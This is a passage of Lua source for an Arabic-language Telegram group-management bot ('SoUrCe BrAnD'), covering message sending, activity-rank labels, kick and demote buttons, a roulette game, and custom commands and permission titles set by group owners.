local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = { ID = "InputMessageSticker", sticker_ = getInputFile(sticker), width_ = 0, height_ = 0 } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end 
function formsgs(msgs) 
local MsgText = ''  
if tonumber(msgs) < 100 then 
MsgText = 'جدا ضعيف' 
elseif tonumber(msgs) < 250 then 
MsgText = 'ضعيف' 
elseif tonumber(msgs) < 500 then 
MsgText = 'غير متفاعل' 
elseif tonumber(msgs) < 750 then 
MsgText = 'متوسط' 
elseif tonumber(msgs) < 1000 then 
MsgText = 'متفاعل' 
elseif tonumber(msgs) < 2000 then 
MsgText = 'قمة التفاعل' 
elseif tonumber(msgs) < 3000 then 
MsgText = 'ملك التفاعل'  
elseif tonumber(msgs) < 4000 then 
MsgText = 'اسطورة التفاعل' 
elseif tonumber(msgs) < 5000 then 
MsgText = 'متفاعل نار' 
elseif tonumber(msgs) < 6000 then 
MsgText = 'يجدح جدح' 
elseif tonumber(msgs) < 7000 then 
MsgText = 'خيالي' 
elseif tonumber(msgs) < 8000 then 
MsgText = 'رب التفاعل' 
elseif tonumber(msgs) < 9000 then 
MsgText = 'كافر بالتفاعل' 
elseif tonumber(msgs) < 10000000000 then 
MsgText = "معلك لربك" 
end 
return MsgText
end
--     SoUrCe BrAnD     --
function BrAnDmoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevBrAnD:get(BrAnD..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     SoUrCe BrAnD     --
function SoUrCeCh(msg) 
local url,res = https.request('https://apiBrAnD.ml/SoUrCeCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.ChatMember.BrAnD ~= true then
Var = false
send(msg.chat_id_,msg.id_,'['..data.ChatMember.BrAnD..']')   
else
Var = true
end
return Var
end
--     SoUrCe BrAnD     --
function ChCheck(msg)
local var = true 
if DevBrAnD:get(BrAnD.."DevBrAnD2") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevBrAnD:get(BrAnD..'DevBrAnD2')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevBrAnD:get(BrAnD..'BrAnD:textch:user') then
local textchuser = DevBrAnD:get(BrAnD..'BrAnD:textch:user')
send(msg.chat_id_,msg.id_,'['..textchuser..']')
else
send(msg.chat_id_,msg.id_,"♰ ⌯ عليك الاشتراك في قناة البوت \n♰ ⌯ قناة البوت ↫ ["..DevBrAnD:get(BrAnD..'DevBrAnD3').."]")
end
elseif data.ok then
return var
end
else
return var
end
end
chats = {}
function tdcli_update_callback(data)
if data.ID == "UpdateNewCallbackQuery" then
local Chat_Id2 = data.chat_id_
local MsgId2 = data.message_id_
local DataText = data.payload_.data_
local Msg_Id2 = data.message_id_/2097152/0.5
if DataText == '/delyes' and DevBrAnD:get(BrAnD..'yes'..data.sender_user_id_) == 'delyes' then
DevBrAnD:del(BrAnD..'yes'..data.sender_user_id_, 'delyes')
DevBrAnD:del(BrAnD..'no'..data.sender_user_id_, 'delno')
if RankChecking(data.sender_user_id_, data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "♰ ⌯ لا استطيع طرد ↫ "..IdRank(data.sender_user_id_, data.chat_id_)) 
return false
end
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=data.chat_id_,user_id_=data.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,da) 
if (da and da.code_ and da.code_ == 400 and da.message_ == "CHAT_ADMIN_REQUIRED") then 
EditMsg(Chat_Id2, Msg_Id2, "♰ ⌯ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if (da and da.code_ and da.code_ == 3) then 
EditMsg(Chat_Id2, Msg_Id2, "♰ ⌯ البوت ليس ادمن يرجى ترقيتي !") 
return false  
end
if da and da.code_ and da.code_ == 400 and da.message_ == "USER_ADMIN_INVALID" then 
EditMsg(Chat_Id2, Msg_Id2, "♰ ⌯ لا استطيع طرد مشرفين المجموعه") 
return false  
end
if da and da.ID and da.ID == "Ok" then
ChatKick(data.chat_id_, data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "♰ ⌯ تم طردك من المجموعه") 
return false
end
end,nil)  
end
if DataText == '/delno' and DevBrAnD:get(BrAnD..'no'..data.sender_user_id_) == 'delno' then
DevBrAnD:del(BrAnD..'yes'..data.sender_user_id_, 'delyes')
DevBrAnD:del(BrAnD..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "♰ ⌯ تم الغاء امر اطردني") 
end
--     SoUrCe BrAnD     --
if DataText == '/yesdel' and DevBrAnD:get(BrAnD..'yesdel'..data.sender_user_id_) == 'delyes' then
DevBrAnD:del(BrAnD..'yesdel'..data.sender_user_id_, 'delyes')
DevBrAnD:del(BrAnD..'nodel'..data.sender_user_id_, 'delno')
if DevBrAnD:sismember(BrAnD..'BrAnD:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevBrAnD:sismember(BrAnD..'BrAnD:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'المدراء • ' else Managers = '' end
if DevBrAnD:sismember(BrAnD..'BrAnD:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevBrAnD:sismember(BrAnD..'BrAnD:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevBrAnD:sismember(BrAnD..'BrAnD:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = '' end
if DevBrAnD:sismember(BrAnD..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'المطايه • ' else donky = '' end
if DevBrAnD:sismember(BrAnD..'BrAnD:Constructor:'..data.chat_id_, data.sender_user_id_) or DevBrAnD:sismember(BrAnD..'BrAnD:Managers:'..data.chat_id_, data.sender_user_id_) or DevBrAnD:sismember(BrAnD..'BrAnD:Admins:'..data.chat_id_, data.sender_user_id_) or DevBrAnD:sismember(BrAnD..'BrAnD:VipMem:'..data.chat_id_, data.sender_user_id_) or DevBrAnD:sismember(BrAnD..'BrAnD:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevBrAnD:sismember(BrAnD..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
DevBrAnD:srem(BrAnD..'BrAnD:Constructor:'..data.chat_id_,data.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:Managers:'..data.chat_id_,data.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:Admins:'..data.chat_id_,data.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:VipMem:'..data.chat_id_,data.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:Cleaner:'..data.chat_id_,data.sender_user_id_)
DevBrAnD:srem(BrAnD..'User:Donky:'..data.chat_id_,data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "♰ ⌯ تم تنزيلك من ↫ ⤈\n~ ( "..constructor..''..Managers..''..admins..''..vipmem..''..cleaner..''..donky.." ) ~ \n") 
else 
if IdRank(data.sender_user_id_, data.chat_id_) == 'العضو' then
EditMsg(Chat_Id2, Msg_Id2, "♰ ⌯ ليس لديك رتبه في البوت") 
else 
EditMsg(Chat_Id2, Msg_Id2, "♰ ⌯ لا استطيع تنزيل ↫ "..IdRank(data.sender_user_id_, data.chat_id_)) 
end
end
end
if DataText == '/nodel' and DevBrAnD:get(BrAnD..'nodel'..data.sender_user_id_) == 'delno' then
DevBrAnD:del(BrAnD..'yesdel'..data.sender_user_id_, 'delyes')
DevBrAnD:del(BrAnD..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "♰ ⌯ تم الغاء امر نزلني") 
end
if DataText == '/YesRolet' and DevBrAnD:get(BrAnD.."BrAnD:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local list = DevBrAnD:smembers(BrAnD..'BrAnD:ListRolet'..data.chat_id_) 
local UserName = list[math.random(#list)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
DevBrAnD:incrby(BrAnD..'BrAnD:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
DevBrAnD:del(BrAnD..'BrAnD:ListRolet'..data.chat_id_) 
DevBrAnD:del(BrAnD.."BrAnD:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "♰ ⌯ *صاحب الحظ* ↫ ["..UserName.."]\n♰ ⌯ *مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
end
if DataText == '/NoRolet' then
DevBrAnD:del(BrAnD..'BrAnD:ListRolet'..data.chat_id_) 
DevBrAnD:del(BrAnD.."BrAnD:NumRolet"..data.chat_id_..data.sender_user_id_) 
DevBrAnD:del(BrAnD.."BrAnD:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "♰ ⌯ تم الغاء اللعبه لاعادة اللعب ارسل الالعاب") 
end
if DataText == '/ListRolet' then
local list = DevBrAnD:smembers(BrAnD..'BrAnD:ListRolet'..data.chat_id_) 
local Text = '♰ ⌯ قائمة الاعبين ↫ ⤈\n⍆═════BR═════⍅\n' 
local Textt = '⍆═════BR═════⍅\n♰ ⌯ تم اكتمال العدد الكلي هل انت مستعد ؟'
for k, v in pairs(list) do 
Text = Text..k.."~ : [" ..v.."]\n"  
end 
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="لا",callback_data="/NoRolet"}}} 
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text..Textt).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if data.ID == "UpdateNewMessage" then
local msg = data.message_
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
text = data.message_.content_.text_
if text and DevBrAnD:get(BrAnD.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevBrAnD:get(BrAnD.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevBrAnD:del(BrAnD.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevBrAnD:del(BrAnD.."Set:Cmd:Group:New"..msg.chat_id_)
DevBrAnD:srem(BrAnD.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم حذف الامر من المجموعه", 1, 'html')  
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ لايوجد امر بهذا الاسم", 1, 'html')
end
DevBrAnD:del(BrAnD.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(DevBrAnD:get(BrAnD..'BrAnD:NameBot') or "براند ")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevBrAnD:get(BrAnD..'BrAnD:NameBot') or "براند ")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = DevBrAnD:get(BrAnD.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and DevBrAnD:get(BrAnD.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevBrAnD:set(BrAnD.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ ارسل الامر الجديد", 1, 'html')
DevBrAnD:del(BrAnD.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevBrAnD:set(BrAnD.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevBrAnD:get(BrAnD.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevBrAnD:get(BrAnD.."Set:Cmd:Group:New"..msg.chat_id_)
DevBrAnD:set(BrAnD.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevBrAnD:sadd(BrAnD.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم حفظ الامر", 1, 'html')
DevBrAnD:del(BrAnD.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "الاوامر المضافه" and ChCheck(msg) then
local list = DevBrAnD:smembers(BrAnD.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "♰ ⌯ قائمة الاوامر المضافه ↫ ⤈ \n⍆═════BR═════⍅\n"
for k,v in pairs(list) do
Cmds = DevBrAnD:get(BrAnD.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..""..k.."~ ("..v..") • {"..Cmds.."}\n"
else
t = t..""..k.."~ ("..v..") \n"
end
end
if #list == 0 then
t = "♰ ⌯ لايوجد اوامر مضافه في المجموعه"
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if text == "حذف الاوامر المضافه" or text == "حذف الاوامر" or text == "مسح الاوامر المضافه" and ChCheck(msg) then
local list = DevBrAnD:smembers(BrAnD.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(list) do
DevBrAnD:del(BrAnD.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevBrAnD:del(BrAnD.."List:Cmd:Group:New"..msg.chat_id_)
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم حذف الاوامر المضافه في المجموعه", 1, 'html')
end
if text == "اضف امر" or text == "اضافة امر" or text == "اضافه امر" and ChCheck(msg) then
DevBrAnD:set(BrAnD.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ ارسل الامر القديم", 1, 'html')
return false
end
if text == "حذف امر" or text == "مسح امر" and ChCheck(msg) then 
DevBrAnD:set(BrAnD.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ ارسل الامر الذي قمت باضافته يدويا", 1, 'html')
return false
end
end
--     SoUrCe BrAnD     --
if text == "الصلاحيات" or text == "صلاحيات" and ChCheck(msg) then 
local list = DevBrAnD:smembers(BrAnD.."Coomds"..msg.chat_id_)
if #list == 0 then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ لاتوجد صلاحيات مضافه", 1, 'html')
return false
end
t = "♰ ⌯ قائمة الصلاحيات المضافه ↫ ⤈ \n⍆═════BR═════⍅\n"
for k,v in pairs(list) do
var = DevBrAnD:get(BrAnD.."Comd:New:rt:BrAnD:"..v..msg.chat_id_)
if var then
t = t..""..k.."~ "..v.." • ("..var..")\n"
else
t = t..""..k.."~ "..v.."\n"
end
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if Admin(msg) then
if text == "حذف الصلاحيات" and ChCheck(msg) or text == "مسح الصلاحيات" and ChCheck(msg) then
local list = DevBrAnD:smembers(BrAnD.."Coomds"..msg.chat_id_)
for k,v in pairs(list) do
DevBrAnD:del(BrAnD.."Comd:New:rt:BrAnD:"..v..msg.chat_id_)
DevBrAnD:del(BrAnD.."Coomds"..msg.chat_id_)
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم حذف الصلاحيات المضافه", 1, 'html')
end
end
if text and text:match("^اضف صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
DevBrAnD:set(BrAnD.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevBrAnD:sadd(BrAnD.."Coomds"..msg.chat_id_,ComdNew)  
DevBrAnD:setex(BrAnD.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n♰ ⌯ ارسل الغاء لالغاء الامر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
DevBrAnD:del(BrAnD.."Comd:New:rt:BrAnD:"..ComdNew..msg.chat_id_)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم حذف الصلاحيه", 1, 'html')
end
if DevBrAnD:get(BrAnD.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم الغاء الامر", 1, 'html')
DevBrAnD:del(BrAnD.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not Constructor(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تستطيع اضافة صلاحية ( عضو • مميز  • ادمن )\n♰ ⌯ ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "ادمن" then
if not Manager(msg) then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تستطيع اضافة صلاحية ( عضو • مميز )\n♰ ⌯ ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مميز" then
if not Admin(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تستطيع اضافة صلاحية ( عضو )\n♰ ⌯ ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = DevBrAnD:get(BrAnD.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevBrAnD:set(BrAnD.."Comd:New:rt:BrAnD:"..textn..msg.chat_id_,text)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم اضافة الصلاحيه", 1, 'html')
DevBrAnD:del(BrAnD.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end

if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_ABBAS = text:match("رفع (.*)")
if DevBrAnD:sismember(BrAnD.."Coomds"..msg.chat_id_,DEV_ABBAS) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrBrAnD = DevBrAnD:get(BrAnD.."Comd:New:rt:BrAnD:"..DEV_ABBAS..msg.chat_id_)
if mrBrAnD == "مميز" and VipMem(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n♰ ⌯ تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevBrAnD:set(BrAnD.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS) 
DevBrAnD:sadd(BrAnD..'BrAnD:VipMem:'..msg.chat_id_, result.sender_user_id_)
elseif mrBrAnD == "ادمن" and Admin(msg) then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n♰ ⌯ تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevBrAnD:set(BrAnD.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)
DevBrAnD:sadd(BrAnD..'BrAnD:Admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrBrAnD == "مدير" and Manager(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n♰ ⌯ تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevBrAnD:set(BrAnD.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)  
DevBrAnD:sadd(BrAnD..'BrAnD:Managers:'..msg.chat_id_, result.sender_user_id_)
elseif mrBrAnD == "عضو" then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n♰ ⌯ تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_ABBAS = text:match("تنزيل (.*)")
if DevBrAnD:sismember(BrAnD.."Coomds"..msg.chat_id_,DEV_ABBAS) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrBrAnD = DevBrAnD:get(BrAnD.."Comd:New:rt:BrAnD:"..DEV_ABBAS..msg.chat_id_)
if mrBrAnD == "مميز" and VipMem(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n♰ ⌯ تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevBrAnD:srem(BrAnD..'BrAnD:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevBrAnD:del(BrAnD.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrBrAnD == "ادمن" and Admin(msg) then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n♰ ⌯ تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevBrAnD:srem(BrAnD..'BrAnD:Admins:'..msg.chat_id_, result.sender_user_id_)
DevBrAnD:del(BrAnD.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrBrAnD == "مدير" and Manager(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n♰ ⌯ تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevBrAnD:srem(BrAnD..'BrAnD:Managers:'..msg.chat_id_, result.sender_user_id_)
DevBrAnD:del(BrAnD.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrBrAnD == "عضو" then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n♰ ⌯ تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("^رفع (.*) @(.*)") then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if DevBrAnD:sismember(BrAnD.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrBrAnD = DevBrAnD:get(BrAnD.."Comd:New:rt:BrAnD:"..text1[2]..msg.chat_id_)
if mrBrAnD == "مميز" and VipMem(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n♰ ⌯ تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevBrAnD:sadd(BrAnD..'BrAnD:VipMem:'..msg.chat_id_, result.id_)
DevBrAnD:set(BrAnD.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrBrAnD == "ادمن" and Admin(msg) then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n♰ ⌯ تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevBrAnD:sadd(BrAnD..'BrAnD:Admins:'..msg.chat_id_, result.id_)
DevBrAnD:set(BrAnD.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrBrAnD == "مدير" and Manager(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n♰ ⌯ تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevBrAnD:sadd(BrAnD..'BrAnD:Managers:'..msg.chat_id_, result.id_)
DevBrAnD:set(BrAnD.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrBrAnD == "عضو" then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n♰ ⌯ تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ *المعرف غير صحيح*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match("^تنزيل (.*) @(.*)") then 
local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if DevBrAnD:sismember(BrAnD.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrBrAnD = DevBrAnD:get(BrAnD.."Comd:New:rt:BrAnD:"..text1[2]..msg.chat_id_)
if mrBrAnD == "مميز" and VipMem(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n♰ ⌯ تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevBrAnD:srem(BrAnD..'BrAnD:VipMem:'..msg.chat_id_, result.id_)
DevBrAnD:del(BrAnD.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrBrAnD == "ادمن" and Admin(msg) then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n♰ ⌯ تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevBrAnD:srem(BrAnD..'BrAnD:Admins:'..msg.chat_id_, result.id_)
DevBrAnD:del(BrAnD.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrBrAnD == "مدير" and Manager(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n♰ ⌯ تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevBrAnD:srem(BrAnD..'BrAnD:Managers:'..msg.chat_id_, result.id_)
DevBrAnD:del(BrAnD.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrBrAnD == "عضو" then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n♰ ⌯ تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ *المعرف غير صحيح*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
--     SoUrCe BrAnD     --
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
DevBrAnD:incr(BrAnD..'BrAnD:UsersMsgs'..BrAnD..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevBrAnD:incr(BrAnD..'BrAnD:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
